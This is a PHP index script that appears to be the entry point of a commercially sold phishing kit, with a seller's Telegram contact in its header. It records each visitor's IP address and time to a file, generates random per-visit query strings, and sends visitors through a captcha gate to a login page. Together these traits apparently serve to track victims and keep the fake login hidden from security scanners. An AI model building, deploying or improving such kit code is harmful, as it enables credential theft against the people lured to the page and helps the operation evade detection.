<?php 
/*

💓 TELEGRAM  : @mr_coder_x1 💓


---- CONTACT US NOW 👇🏻  ----
✨ TELEGRAM:  https://t.me/mr_coder_x1
—————————————————
📌 Join Our New Channel : https://t.me/channelmrcoderx

*/

ob_start();
session_start();
date_default_timezone_set('GMT');
$dateNow=date("d/m/Y h:i:s A");
$iiiip=$_SERVER['REMOTE_ADDR'];
$code=" $iiiip | {$dateNow} \r\n";
$save=fopen("./ip.txt","a+");
fwrite($save,$code);
fclose($save);
$xxx = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
session_start();
include './config.php';




if ($reCaptcha === 'off') {
    $_SESSION['captcha_passed'] = true;
    header("Location: ./app/login.php?$xxx");
    exit;
} else {
    if (!empty($_SESSION['captcha_passed']) && $_SESSION['captcha_passed'] === true) {
        header("Location: ./app/login.php?$xxx");
        exit;
    } else {
        header("Location: ./home/index.php?$xxx");
        exit;
    }
}

?>

